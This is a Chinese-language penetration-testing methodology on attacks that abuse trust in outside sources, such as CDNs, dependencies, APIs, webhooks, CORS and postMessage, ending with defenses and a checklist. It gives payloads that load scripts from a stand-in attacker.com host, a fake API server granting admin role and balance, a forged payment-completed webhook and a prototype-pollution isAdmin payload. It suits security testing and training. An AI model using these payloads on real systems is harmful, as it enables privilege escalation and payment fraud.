# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化、可复现的不可信源攻击（Untrusted Source Attack）测试与利用流程。通过本方法论，测试人员能够系统性地检测和利用系统信任不可信数据源的漏洞，包括第三方库引入、外部 API 调用、动态资源加载、跨域信任滥用等技术。

## 1.2 适用范围

本文档适用于以下场景：
- Web 应用加载外部资源
- 应用使用第三方库/SDK
- 调用外部 API 服务
- 动态代码加载/执行
- 跨域资源共享
- 微服务架构中的服务间调用

## 1.3 读者对象

本文档主要面向：
- 执行渗透测试任务的安全工程师
- 进行供应链安全评估的顾问
- 负责应用架构安全的技术人员
- 安全研究人员

---

# 第二部分：核心渗透技术专题

## 专题一：不可信源攻击

### 2.1 技术介绍

不可信源攻击（Untrusted Source Attack）是利用系统对不可信数据源的过度信任进行的攻击。当应用从不可信或未验证的来源获取代码、数据、配置时，攻击者可以通过污染这些来源来影响应用行为。

**攻击原理：**
- **第三方依赖攻击：** 通过污染的第三方库植入恶意代码
- **外部 API 攻击：** 通过伪造或污染 API 响应影响应用
- **动态资源加载：** 通过篡改动态加载的资源执行恶意代码
- **跨域信任滥用：** 利用跨域信任关系进行攻击
- **配置源攻击：** 通过污染配置文件影响应用行为
- **回调函数攻击：** 通过可控的回调参数执行恶意代码

**本质：** 应用未能正确验证外部数据源的可信度，违背了"零信任"原则。

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| **前端应用** | 加载 CDN 脚本 | 第三方脚本被篡改或劫持 |
| **后端服务** | 调用外部 API | API 响应被伪造或篡改 |
| **微服务** | 服务间调用 | 内部服务被入侵影响下游 |
| **数据处理** | 导入外部数据 | 数据源被污染 |
| **配置管理** | 远程配置中心 | 配置被篡改 |
| **插件系统** | 第三方插件加载 | 恶意插件被执行 |
| **Webhook** | 接收外部回调 | 伪造 Webhook 请求 |
| **SSO 登录** | 第三方身份提供商 | 身份响应被伪造 |
| **支付集成** | 支付网关回调 | 支付状态被伪造 |
| **数据分析** | 第三方分析 SDK | SDK 被植入恶意代码 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**外部依赖识别：**

1. **识别前端外部资源**
   ```bash
   # 检查 HTML 中的外部资源
   curl https://target.com | grep -E "src=|href="
   
   # 识别 CDN 资源
   # - cdn.jsdelivr.net
   # - cdnjs.cloudflare.com
   # - unpkg.com
   # - code.jquery.com
   
   # 检查第三方脚本
   # - Google Analytics
   # - Facebook Pixel
   # - 客服聊天脚本
   ```

2. **识别后端外部调用**
   ```bash
   # 通过响应头识别
   curl -I https://target.com/api/data
   # X-Powered-By, X-Upstream-Server 等
   
   # 通过响应时间识别
   # 外部 API 调用通常有较高延迟
   
   # 通过错误信息识别
   # 错误可能暴露外部服务信息
   ```

3. **测试外部输入处理**
   ```bash
   # 测试 Webhook 端点
   curl -X POST https://target.com/webhook \
     -H "Content-Type: application/json" \
     -d '{"event": "test", "data": {"malicious": "payload"}}'
   
   # 测试回调 URL
   curl "https://target.com/api/callback?url=http://attacker.com/hook"
   ```

#### 2.3.2 白盒测试

**代码审计要点：**

1. **检查外部资源加载**
   ```javascript
   // 危险模式：动态加载不可信脚本
   function loadScript(url) {
       const script = document.createElement('script');
       script.src = url;  // 用户可控
       document.head.appendChild(script);
   }
   
   // 安全模式：白名单验证
   function loadScript(url) {
       const allowedDomains = ['cdn.trusted.com'];
       if (!allowedDomains.some(d => url.startsWith(d))) {
           throw new Error('Untrusted source');
       }
   }
   ```

2. **检查外部 API 调用**
   ```python
   # 危险模式：无验证的 API 响应
   def get_user_data(user_id):
       response = requests.get(f'https://external-api.com/user/{user_id}')
       return response.json()  # 直接使用响应
   
   # 安全模式：验证响应
   def get_user_data(user_id):
       response = requests.get(f'https://external-api.com/user/{user_id}')
       if not verify_signature(response):
           raise Exception('Invalid response')
       return response.json()
   ```

3. **检查依赖配置**
   ```json
   // 危险模式：使用 latest 或模糊版本
   {
     "dependencies": {
       "some-package": "*",
       "another-package": "latest"
     }
   }
   
   // 安全模式：固定版本
   {
     "dependencies": {
       "some-package": "1.2.3"
     }
   }
   ```

### 2.4 漏洞利用方法

#### 2.4.1 第三方脚本攻击

**方法 1：CDN 劫持**
```bash
# 如果目标加载的 CDN 资源无 SRI
<script src="https://cdn.example.com/lib.js"></script>

# 攻击者可以：
# 1. 入侵 CDN 提供商
# 2. 利用 CDN 配置错误
# 3. 进行中间人攻击

# 篡改后的脚本将执行恶意代码
```

**方法 2：依赖混淆**
```bash
# 发布与内部包同名的公共包
npm publish --scope @internal/package
# 如果内部配置不当，可能下载公共包
```

#### 2.4.2 外部 API 攻击

**方法 1：API 响应伪造**
```bash
# 伪造外部 API 响应
# 如果目标服务器连接攻击者控制的 API

# 设置恶意 API 服务器
cat > api_server.py << EOF
from flask import Flask, jsonify
app = Flask(__name__)

@app.route('/user/<user_id>')
def get_user(user_id):
    return jsonify({
        'user_id': user_id,
        'role': 'admin',  # 提权
        'balance': 999999  # 篡改余额
    })

app.run(port=80)
EOF
```

**方法 2：API 中间人攻击**
```bash
# 拦截和修改 API 请求/响应
mitmproxy --mode transparent

# 修改响应内容
# 例如：将 is_verified: false 改为 true
```

#### 2.4.3 动态资源加载攻击

**方法 1：URL 参数注入**
```bash
# 如果应用动态加载资源
https://target.com/page?theme=http://attacker.com/malicious.css

# 或加载恶意脚本
https://target.com/page?widget=http://attacker.com/evil.js
```

**方法 2：原型链污染**
```javascript
// 如果外部数据直接合并到对象
function mergeConfig(userConfig) {
    Object.assign(config, userConfig);  // 危险
}

// 攻击 payload
{
  "__proto__": {
    "isAdmin": true
  }
}
```

#### 2.4.4 跨域信任滥用

**方法 1：CORS 配置滥用**
```bash
# 如果目标设置宽松的 CORS
curl -H "Origin: http://attacker.com" \
  https://target.com/api/user/data

# 检查响应头
# Access-Control-Allow-Origin: *  # 危险
# Access-Control-Allow-Credentials: true  # 配合 * 更危险
```

**方法 2：PostMessage 滥用**
```javascript
// 如果目标使用 postMessage 且验证不足
// 攻击者可以向目标发送恶意消息

const targetWindow = window.open('https://target.com');
targetWindow.postMessage({
  type: 'LOGIN_SUCCESS',
  user: 'admin'
}, '*');
```

#### 2.4.5 Webhook 攻击

**伪造 Webhook 请求：**
```bash
# 如果 Webhook 无签名验证
curl -X POST https://target.com/webhook/payment \
  -H "Content-Type: application/json" \
  -d '{
    "event": "payment.completed",
    "data": {
      "amount": 999999,
      "user_id": "attacker"
    }
  }'
```

#### 2.4.6 信息收集命令

```bash
# 收集外部依赖信息
curl https://target.com | grep -oE "https?://[^\"]+" | sort -u

# 检查 CORS 配置
curl -H "Origin: http://attacker.com" \
  -I https://target.com/api/data

# 检查外部 API 调用
curl -v https://target.com/api/action 2>&1 | grep -i "location\|upstream"
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过 SRI 验证

**方法 1：利用缺失的 SRI**
```bash
# 如果脚本标签无 integrity 属性
<script src="https://cdn.example.com/lib.js"></script>
# 可以篡改 CDN 内容

# 如果有 SRI 但算法弱（SHA256 以下）
# 可能通过碰撞攻击绕过
```

#### 2.5.2 绕过 CSP 限制

**方法 1：利用宽松 CSP**
```bash
# 如果 CSP 配置宽松
# Content-Security-Policy: script-src * data:

# 可以从任意源加载脚本
<script src="http://attacker.com/malicious.js"></script>
```

**方法 2：利用 nonce 泄露**
```bash
# 如果 nonce 在页面中可获取
# 可以使用该 nonce 执行内联脚本
```

#### 2.5.3 绕过 API 认证

**方法 1：利用弱签名验证**
```bash
# 如果 API 签名验证有缺陷
# 可以伪造签名或使用重放攻击
```

**方法 2：利用凭证泄露**
```bash
# 从客户端代码、日志、错误信息中获取 API 密钥
# 使用窃取的密钥调用 API
```

#### 2.5.4 持久化技术

**DNS 持久化：**
```bash
# 如果成功影响 DNS 配置
# 可以长期劫持外部资源请求
```

**配置持久化：**
```bash
# 如果能修改远程配置
# 可以持续影响应用行为
```

---

# 第三部分：附录

## 3.1 常用 Payload 速查表

| 类别 | 目标 | Payload 示例 | 说明 |
|-----|------|------------|------|
| **原型链污染** | JavaScript 对象 | `{"__proto__": {"isAdmin": true}}` | 原型链注入 |
| **CORS 滥用** | 跨域请求 | `-H "Origin: http://attacker.com"` | 测试 CORS 配置 |
| **Webhook 伪造** | 支付回调 | `{"event": "payment.completed"}` | 伪造支付成功 |
| **动态加载** | 资源 URL | `?script=http://attacker.com/evil.js` | 动态脚本加载 |
| **PostMessage** | 跨域消息 | `postMessage({type: 'LOGIN'}, '*')` | 伪造登录消息 |

## 3.2 外部源风险等级

| 源类型 | 风险等级 | 建议 |
|-------|---------|------|
| **公共 CDN** | 中 - 高 | 使用 SRI 验证 |
| **npm/PyPI 包** | 中 | 固定版本，定期审计 |
| **外部 API** | 中 - 高 | 验证响应签名 |
| **用户生成内容** | 高 | 严格过滤和验证 |
| **第三方 SDK** | 中 - 高 | 限制权限，监控行为 |
| **Webhook** | 高 | 验证签名和来源 |
| **跨域请求** | 中 - 高 | 严格 CORS 配置 |

## 3.3 不可信源安全检查清单

- [ ] 外部脚本使用 SRI 验证
- [ ] 依赖版本固定且定期审计
- [ ] 外部 API 响应有签名验证
- [ ] CORS 配置严格且合理
- [ ] Webhook 请求验证签名
- [ ] 动态资源加载有白名单
- [ ] 跨域消息有来源验证
- [ ] 第三方 SDK 权限最小化
- [ ] 外部输入严格过滤
- [ ] 有外部依赖监控

## 3.4 防御建议

1. **SRI 验证**：对所有外部脚本使用子资源完整性验证
2. **依赖锁定**：固定所有依赖版本，使用锁文件
3. **API 验证**：验证外部 API 响应的签名和完整性
4. **CSP 策略**：实施严格的内容安全策略
5. **CORS 限制**：配置严格的跨域资源共享策略
6. **Webhook 签名**：验证所有 Webhook 请求的签名
7. **白名单机制**：动态资源加载使用白名单
8. **零信任**：对所有外部输入保持怀疑态度
9. **依赖审计**：定期审计第三方依赖安全性
10. **监控告警**：监控外部依赖异常行为
